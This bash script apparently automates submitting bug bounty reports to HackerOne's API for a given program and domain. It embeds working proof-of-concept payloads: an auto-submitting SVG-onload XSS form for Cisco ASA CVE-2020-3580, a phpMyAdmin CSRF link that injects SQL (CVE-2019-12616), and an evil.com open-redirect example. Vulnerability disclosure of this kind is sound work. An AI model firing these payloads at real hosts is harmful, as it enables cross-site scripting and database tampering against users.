#in order to run this script properly you need to define your username and api keys in config.txt
#using export username and apikey

#load credentials and other params
. ./config.txt

if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ] || [ -z "$4" ]
    then
    #production mode runs the API call against your real real real account (be careful)
    #testing mode runs the API call against a testing program created in the sandbox
    #dry-run mode does not run the API call. Useful to debug the parameters without sending anything to H1
    echo "Use ${FUNCNAME[0]} programName vulnerableDomain (test mode: -t, -p is production mode, -d is dry run mode ) bug "
    echo "Example ${FUNCNAME[0]} att www.att.com [-t, -n, -d] CVE-2020-3580"
    exit;
fi

#input params
program=$1
domain=$2
mode=$3
bug=$4

#global vars
apiEndpoint="https://api.hackerone.com/v1/hackers/reports"

#TODO define this as a file template (yaml maybe?)
# creates a report for CVE-2020-3580
if [ "$bug" == "CVE-2020-3580" ]
then
    #name of the resulting POC file
    file="post-xss-$domain.html"
    URL="$reportsURL/$file"
    echo "POC URL: " $URL

    #replace the url from template to new POC
    sed "s/DOMAIN/$domain/g" $postXSStemplate > $file

    title='XSS due to CVE-2020-3580 ['$domain']'
    bodySummary="Multiple vulnerabilities in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct cross-site scripting (XSS) attacks against a user of the web services interface of an affected device. \n\n "
    bodyStepsToRep="Steps To Reproduce \n\n Go to this  URL \n\n "$URL" \n\n HTML POC:\n \n <html>\n  <body>\n <script>history.pushState('', '', '/')</script>\n <form action='https://'$domain'/+CSCOE+/saml/sp/acs?tgname=a' method='POST'>\n <input type='hidden' name='SAMLResponse' value='&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;document&#46;cookies&#41;&gt;'/>\n </form>\n <script>\n document.forms[0].submit();\n</script>\n</body>\n</html>\n\n"
    body="$bodySummary$bodyStepsToRep"
    impact="- An attacker could exploit these vulnerabilities by persuading a user of the interface to click a crafted link.\n - A successful exploit could allow the attacker to execute arbitrary script code in the context of the interface or allow the attacker to access sensitive, browser-based information. \n\n Note: These vulnerabilities affect only specific AnyConnect and WebVPN configurations.\n\n Supporting Material References\n https://www.exploit-db.com/exploits/47988\n https://twitter.com/sagaryadav8742/status/1275170967527006208\n"
    weaknessId=61

#phpmyadmin CVE-2019-12616
elif [ "$bug" == "CVE-2019-12616" ] 
then
    if [ -z "$5" ]
    then
        echo "For this bug you need to include the version of the PhpMyAdmin instance"
        exit
    fi
    #specific phpmyin version to be added to the report
    version="$5"
    title='PhpMyAdmin instance vulnerable to CVE-2019-12616 ['$domain']'    
    bodySummary="An issue was discovered in phpMyAdmin before 4.9.0. A vulnerability was found that allows an attacker to trigger a CSRF attack against a phpMyAdmin user. The attacker can trick the user, for instance through a broken <img> tag pointing at the victim's phpMyAdmin database, and the attacker can potentially deliver a payload (such as a specific INSERT or DELETE statement) to the victim.\n\n Installed version $version  which is vulnerable (phpMyAdmin <= 4.9.0)\n Version number can be checked here https://"$domain"/phpmyadmin/doc/html/index.html\n\n"
    bodyStepsToRep="PhpMyAdmin endpoint  \n - https://"$domain"/phpmyadmin/\n\nCreate a HTML file with the following content\n\n<html>\n<head>\n<title>POC CVE-2019-12616</title>\n</head>\n<body>\n<a href='https://"$domain"/phpmyadmin/tbl_sql.php?sql_query=INSERT+INTO+\`pma__bookmark\`+(\`id\`%2C+\`dbase\`%2C+\`user\`%2C+\`label\`%2C+\`query\`)+VALUES+(DAYOFWEEK('')%2C+''%2C+''%2C+''%2C+'')&show_query=1&db=phpmyadmin&table=pma__bookmark'>View my Pictures!</a>\n</body>\n</html>\n\nAn attacker can create a page using the above HTML code, trick the victim into clicking the URL and performing Insert/Delete actions to the database. "
    body="$bodySummary$bodyStepsToRep"
    impact="An attacker can perform arbitrary actions on behalf of the victim, such as execute arbitrary INSERT or DELETE statements, delete an arbitrary server on the Setup page. \n\n Supporting Material/References \n* https://nvd.nist.gov/vuln/detail/CVE-2019-12616\n* **Exploit** https://www.exploit-db.com/exploits/46982"
    weaknessId=45

#generic open redirect bug
elif [ "$bug" == "open-redirect" ] 
then
    if [ -z "$5" ]
    then
        echo "For this bug you need to include the full URL (use evil.com)"
        exit

    fi 
    url="$5"
    title='Open redirect ['$domain']'    
    bodySummary="There is an open redirection vulnerability that allows an attacker to redirect anyone to malicious sites.\n\n"
    bodyStepsToRep="Steps To Reproduce\n\n Go to this URL:\n"$url" As you can see it redirects to https://www.evil.com"

    body="$bodySummary$bodyStepsToRep"
    impact="Attackers can serve malicious websites that steal passwords or download ransomware to their victims machine due to a redirect.\nThey can also use the URL to trick users into revealing their public IP address.\n"
    severity="low"
    weaknessId=53
else
    echo "$bug, Bug type not found"
    exit
fi 

data='{"data": {"type": "report",
       "attributes": {
       "team_handle": "'$program'",
       "title": "'$title'",
       "vulnerability_information": "'$body'",
       "weakness_id": '$weaknessId',
       "impact": "'$impact'"}}}'
#debug
#echo $data
#TODO parse api response

#dry run mode
if [ "$mode" == "-d" ]
then
	echo "Running in dry-run mode"
    echo $data
    echo "$reportsURL"
    echo "Credentials: "$usernameTesting:$apikeyTesting
    echo "Credentials: "$usernameProduction:$apikeyProduction
fi
#production mode
if [ "$mode" == "-p" ]
then
    echo "Running in production mode"
    echo "Making API call"
    curl $apiEndpoint -u "$usernameProduction:$apikeyProduction" -H 'Content-Type: application/json' -H 'Accept: application/json' -d "$data"
fi 
#testing mode
if [ "$mode" == "-t" ]
then
    echo "Running in testing mode"
    echo "Making API call"
    curl $apiEndpoint -u "$usernameTesting:$apikeyTesting" -H 'Content-Type: application/json' -H 'Accept: application/json' -d "$data"
fi 
